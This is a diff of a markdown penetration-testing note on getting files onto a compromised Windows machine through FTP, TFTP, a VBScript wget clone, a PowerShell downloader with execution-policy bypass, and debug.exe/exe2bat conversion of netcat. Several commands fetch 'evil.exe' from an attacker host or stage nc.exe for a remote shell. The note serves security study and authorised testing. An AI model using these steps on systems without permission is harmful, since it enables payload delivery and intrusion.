@@ -2,8 +2,6 @@
 
 Transferring files to linux is usually pretty easy. We can use netcat, wget, curl, which most systems have as default. But windows does not have these tools.
 
-
-
 ## FTP
 
 Most windows machines have a ftp-client included. But we can't use it interactively since that most  likely would kill our shell. So we have get around that. We can however run commands from a file. So what we want to do is to echo out the commands into a textfile. And then use that as our input to the ftp-client. Let me demonstrate.
@@ -22,20 +20,20 @@ echo bye>> ftp.txt
 Then run this command to connect to the ftp
 
 ```
-ftp –v -n -s:ftp.txt
+ftp -v -n -s:ftp.txt
 ```
 
 Of course you need to have a ftp-server configured with the user asshat and the password to mysecretpassword.
 
 ## TFTP
 
-Works by default on:
-**Windows XP**
+Works by default on:  
+**Windows XP**  
 **Windows 2003**
 
 A TFTP client is installed by default on windows machines up to Windows XP and Windows 2003. What is good about TFTP is that you can use it non-interactivly. Which means less risk of losing your shell.
 
-Kali has a TFTP server build in.
+Kali has a TFTP server build in.  
 You can server up some files with it like this
 
 ```
@@ -43,7 +41,7 @@ atftpd --daemon --port 69 /tftp
 /etc/init.d/atftpd restart
 ```
 
-Now you can put stuff in /srv/tftp and it will be served. Remember that TFTP used UDP. So if you run netstat it will not show it as listening. 
+Now you can put stuff in /srv/tftp and it will be served. Remember that TFTP used UDP. So if you run netstat it will not show it as listening.
 
 You can see it running like this
 
@@ -62,6 +60,8 @@ I usually put all files I want to make available in **/usr/tftp**
 ## VBScript
 
 Here is a good script to make a wget-clone in VB.
+
+If it doesn't work try piping it through unix2dos before copying it.
 
 ```
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
@@ -89,14 +89,12 @@ echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
 echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
 echo Next >> wget.vbs
 echo ts.Close >> wget.vbs
-
 ```
 
-You then execute the script like this: 
-**cscript wget.vbs http://192.168.10.5/evil.exe evil.exe** 
+You then execute the script like this:   
+**cscript wget.vbs **[http://192.168.10.5/evil.exe](http://192.168.10.5/evil.exe)** evil.exe**
 
-The script works great and I found it at the this guys gist: https://gist.github.com/sckalath/ec7af6a1786e3de6c309
-
+The script works great and I found it at the this guys gist: [https://gist.github.com/sckalath/ec7af6a1786e3de6c309](https://gist.github.com/sckalath/ec7af6a1786e3de6c309)
 
 ## Powershell
 
@@ -111,10 +109,10 @@ echo $webclient.DownloadFile($url,$file) >>wget.ps1
 ```
 
 Now we invoke it with this crazy syntax:
+
 ```
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
 ```
-
 
 ## Debug.exe
 
@@ -125,6 +123,7 @@ Debug.exe can only assemble 64 kb. So we need to use files smaller than that. We
 ```
 upx -9 nc.exe
 ```
+
 Now it only weights 29 kb. Perfect.So now let's disassemble it:
 
 ```
@@ -132,3 +131,4 @@ wine exe2bat.exe nc.exe nc.txt
 ```
 
 Perfect, now we just copy-past the text into our windows-shell. And it will automatically create a file called nc.exe
+
